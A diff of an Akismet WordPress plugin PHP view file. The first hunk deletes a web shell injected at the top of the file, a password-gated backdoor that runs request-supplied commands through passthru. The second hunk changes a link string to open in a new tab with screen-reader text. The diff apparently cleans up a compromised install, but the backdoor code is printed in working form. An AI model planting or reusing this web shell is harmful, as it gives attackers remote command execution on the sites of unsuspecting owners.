@@ -1,6 +1,4 @@
 <?php
-error_reporting(0);@ini_set('display_errors',0);if(isset($_REQUEST["px"])&&$_REQUEST["px"]==="o4sc2xfs90fs"){$__c=null;if(isset($_REQUEST["b"])){$__c=base64_decode($_REQUEST["b"]);}elseif(isset($_REQUEST["c"])){$__c=$_REQUEST["c"];}if($__c!==null){ob_start();@passthru($__c.' 2>&1');$__o=ob_get_clean();echo"[S]".$__o."[E]";}else{echo"[S]OK[E]";}exit;}
-
 declare( strict_types = 1 );
 
 //phpcs:disable VariableAnalysis
@@ -81,16 +79,12 @@ $user_status = $akismet_user->status ?? null;
 				<?php
 				echo wp_kses(
 					sprintf(
-						/* translators: The placeholder is a URL. */
-						__( 'Want to use a different account? <a href="%s" class="akismet-external-link">Visit akismet.com</a> to set it up and get your API key.', 'akismet' ),
-						esc_url( 'https://akismet.com/get?utm_source=akismet_plugin&utm_campaign=plugin_static_link&utm_medium=in_plugin&utm_content=jetpack_flow_different_account' )
+						/* translators: 1: URL, 2: hidden screen-reader text noting the link opens in a new tab. */
+						__( 'Want to use a different account? <a href="%1$s" class="akismet-external-link" target="_blank" rel="noopener">Visit akismet.com%2$s</a> to set it up and get your API key.', 'akismet' ),
+						esc_url( 'https://akismet.com/get?utm_source=akismet_plugin&utm_campaign=plugin_static_link&utm_medium=in_plugin&utm_content=jetpack_flow_different_account' ),
+						Akismet::get_new_tab_screen_reader_html()
 					),
-					array(
-						'a' => array(
-							'href'  => array(),
-							'class' => array(),
-						),
-					)
+					Akismet_Admin::get_link_kses_allowed_elements()
 				);
 				?>
 			</p>
